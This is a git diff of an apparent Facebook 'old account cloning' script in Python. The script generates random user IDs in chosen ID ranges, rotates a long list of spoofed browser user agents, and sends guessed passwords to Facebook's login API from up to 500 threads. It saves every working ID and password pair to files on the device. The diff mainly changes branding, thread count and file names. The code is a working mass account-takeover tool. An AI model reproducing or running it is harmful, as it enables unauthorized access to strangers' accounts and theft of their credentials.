@@ -48,7 +48,7 @@ except ModuleNotFoundError:
 
     os.system('pip install requests bs4 futures==2 > /dev/null')
 
-    os.system('python oldfbcloning.py')
+    os.system('python oldfbclonings.py')
 
 #####____Auto-Create-Setup____#####
 
@@ -80,7 +80,7 @@ except:print('\n Pycurl Module Error!\n Contact With Owner! ');exit()
 
 import random
 
-os.system('https://chat.whatsapp.com/GZcUQsq4OZsDW1JajH6PUa?s=cl&p=a&ilr=4')
+os.system('xdg-open https://youtube.com/@yeitechmonto?si=KuFvD1d932SY-U6G')
 
 
 
@@ -93,36 +93,29 @@ class OLD_CLONER:
     
     def banner(self):
         os.system("clear")
-        
-
-
-        print(".########....###....##.....##....###....########.....##.....##..#######..########..########..######.")
-        print("......##....##.##...###...###...##.##...##.....##....###...###.##.....##.##.....##.##.......##....##")
-        print(".....##....##...##..####.####..##...##..##.....##....####.####.##.....##.##.....##.##.......##......")
-        print("....##....##.....##.##.###.##.##.....##.########.....##.###.##.##.....##.##.....##.######....######.")
-        print("...##.....#########.##.....##.#########.##...##......##.....##.##.....##.##.....##.##.............##")
-        print("..##......##.....##.##.....##.##.....##.##....##.....##.....##.##.....##.##.....##.##.......##....##")
-        print(".########.##.....##.##.....##.##.....##.##.....##....##.....##..#######..########..########..######.")
-                                                                                                                                                                                                                                                                           
+        print("\033[1;32m   ###    ########  ##    ##  #######  ##       ########  ")
+        print("\033[1;32m  ## ##   ##     ## ###   ## ##     ## ##       ##     ## ")
+        print("\033[1;32m ##   ##  ##     ## ####  ## ##     ## ##       ##     ## ")
+        print("\033[1;32m##     ## ########  ## ## ## ##     ## ##       ##     ## ")
+        print("\033[1;32m######### ##   ##   ##  #### ##     ## ##       ##     ## ")
+        print("\033[1;32m##     ## ##    ##  ##   ### ##     ## ##       ##     ## ")
+        print("\033[1;32m##     ## ##     ## ##    ##  #######  ######## ########  ")
         print("\033[1;37m------------------------------------------------")
-        
-        print("\033[1;33m[+]\033[1;34mCREATED  : ZAMAR")
-        print("\033[1;33m[+]\033[1;36mFB-CLONING : OLD & NEW IDS CLONING")
-        print("\033[1;33m[+]\033[1;35mVERSION : 1.0")
-        print("\033[1;33m[+]\033[1;32mSTATUS : ACTIVE")
-        print("------------------------------------------------")
+        print("\033[1;33m[+]\033[1;35mAUTHOR  : ZAMAR")
+        print("\033[1;33m[+]\033[1;35mVERSION : OLD CRACK")
+        print("\033[1;33m[+]\033[1;35mVERSION : 0")
+        print("\033[1;37m------------------------------------------------")
     
     def main(self):
         self.banner()
-        print("\033[1;35m[\033[1;37m1\033[1;35m] â€¢ \033[1;32m 2011-2012 METHOD")
-        print("\033[1;32m[\033[1;37m2\033[1;32m] â€¢ \033[1;32m 2010 METHOD")
-        print("\033[1;34m[\033[1;37m3\033[1;34m] â€¢ \033[1;32m 2009 METHOD")
-        print("\033[1;36m[\033[1;37m4\033[1;36m] â€¢ \033[1;32m 2008 METHOD")
-        print("\033[1;37m[\033[1;37m5\033[1;37m] â€¢ \033[1;32m 2007 METHOD")
-        print("\033[1;33m[\033[1;37m6\033[1;33m] â€¢ \033[1;32m 2005-2006 METHOD")
-        print("\033[1;33m[\033[1;37m7\033[1;33m] â€¢ \033[1;32m 2025 METHOD")
-        print("\033[1;35m[\033[1;37m0\033[1;35m] â€¢ \033[1;32m EXIT")
-        print("\033[1;37m------------------------------------------------")
+        print("\033[1;35m[\033[1;37m1\033[1;35m] • \033[1;32m 2011-2012 METHOD")
+        print("\033[1;32m[\033[1;37m2\033[1;32m] • \033[1;32m 2010 METHOD")
+        print("\033[1;34m[\033[1;37m3\033[1;34m] • \033[1;32m 2009 METHOD")
+        print("\033[1;36m[\033[1;37m4\033[1;36m] • \033[1;32m 2008 METHOD")
+        print("\033[1;37m[\033[1;37m5\033[1;37m] • \033[1;32m 2007 METHOD")
+        print("\033[1;33m[\033[1;37m6\033[1;33m] • \033[1;32m 2005-2006 METHOD")
+        print("\033[1;35m[\033[1;37m0\033[1;35m] • \033[1;32m EXIT")
+        print("------------------------------------------------")
         select = input("SELECT OPTION : ")
         if select == "1":self.oldClone("2013-14")
         elif select == "2":self.oldClone("2010")
@@ -130,17 +123,13 @@ class OLD_CLONER:
         elif select == "4":self.oldClone("2008")
         elif select == "5":self.oldClone("2007")
         elif select == "6":self.oldClone("2005-2006")
-        elif select == "7":self.oldClone("2025")
         else:self.main()
-    print("------------------------------------------------")
+    
     def oldClone(self,series):
         self.banner()
         if series == "2013-14":
             self.uX = "100009"
             self.uG = 11
-        elif series == "2025":
-             self.uX = "615734"
-             self.uG = 14
         elif series == "2010":
             self.uX = "100001"
             self.uG = 10
@@ -162,13 +151,13 @@ class OLD_CLONER:
         print("EXAMPLE  - 5000,10000")
         limit = int(input("SELECT   - "))
         for a in range(limit):
-            Zamar = "".join(random.choice(string.digits) for _ in range(self.uG))
-            self.gen.append(Zamar)
-        with ThreadPoolExecutor(max_workers=200) as Mr_Code:
+            ZAMAR = "".join(random.choice(string.digits) for _ in range(self.uG))
+            self.gen.append(ZAMAR)
+        with ThreadPoolExecutor(max_workers=500) as Mr_Code:
             self.banner()
-            print(" \033[1;32m [\033[1;37mâˆš\033[1;32m] \033[1;37m TOTAL IDS \033[1;32m - "+str(len(self.gen)))
-            print(" \033[1;32m [\033[1;37mâˆš\033[1;32m]  \033[1;37mUID SERIES \033[1;32m - "+series)
-            print(" \033[1;32m [\033[1;37mâˆš\033[1;32m]  \033[1;33mIF NO RESULT USE FLIGHT MODE")
+            print(" \033[1;32m [\033[1;37m√\033[1;32m] \033[1;37m TOTAL IDS \033[1;32m - "+str(len(self.gen)))
+            print(" \033[1;32m [\033[1;37m√\033[1;32m]  \033[1;37mUID SERIES \033[1;32m - "+series)
+            print(" \033[1;32m [\033[1;37m√\033[1;32m]  \033[1;33mIF NO RESULT USE FLIGHT MODE")
             print("------------------------------------------------")
             for love in self.gen:
                 ids = self.uX + love
@@ -299,7 +288,7 @@ class OLD_CLONER:
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
-  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0..."
+  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
@@ -447,7 +436,7 @@ class OLD_CLONER:
   "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
   "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
   "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
-  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HDâ„¢ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
+  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
   "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
   "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
   "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
@@ -539,23 +528,7 @@ class OLD_CLONER:
   "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
-  "Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z00LD Build/MMB29P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/179.0.0.44.83",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Safari/605.1.1	43.03",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.3	21.05",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3	17.34",
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3	3.72",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Trailer/93.3.8652.5	2.48",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.	2.48",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.	2.48",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 OPR/117.0.0.	2.48",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.	1.24",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.1958	1.24",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.	1.24",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.3	1.24",
-  "Mobile/14E5239e YisouSpider/5.0 Safari/602.	0.49",
-  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.	0.49",
-  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.3	0.49",
-  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.3	0.49;",]
+  "Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z00LD Build/MMB29P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/179.0.0.44.83;",]
         max = random.choice(ua_list)
         return str(max)
     
@@ -607,13 +580,13 @@ class OLD_CLONER:
                 url = "https://b-graph.facebook.com/auth/login"
                 response = requests.post(url,data=data,headers=head,verify=True).json()
                 if "access_token" in response:
-                    print(f"\r\r\x1b[38;5;46mZamar-OK â€¢ {ids} â€¢ {pas}")
-                    open("/sdcard/-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
+                    print(f"\r\r\x1b[38;5;46mZAMAR-OK • {ids} • {pas}")
+                    open("/sdcard/ZAMAR-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                     self.oks.append(ids)
                     break
                 elif "www.facebook.com" in response["error"]["message"]:
-                    print(f"\r\r\x1b[38;5;46mZamar-OK â€¢ {ids} â€¢ {pas}")                      
-                    open("/sdcard/Zamar-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
+                    print(f"\r\r\x1b[38;5;46mZAMAR-OK • {ids} • {pas}")                      
+                    open("/sdcard/ZAMAR-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                     self.cps.append(ids)
                     break
                 else:continue
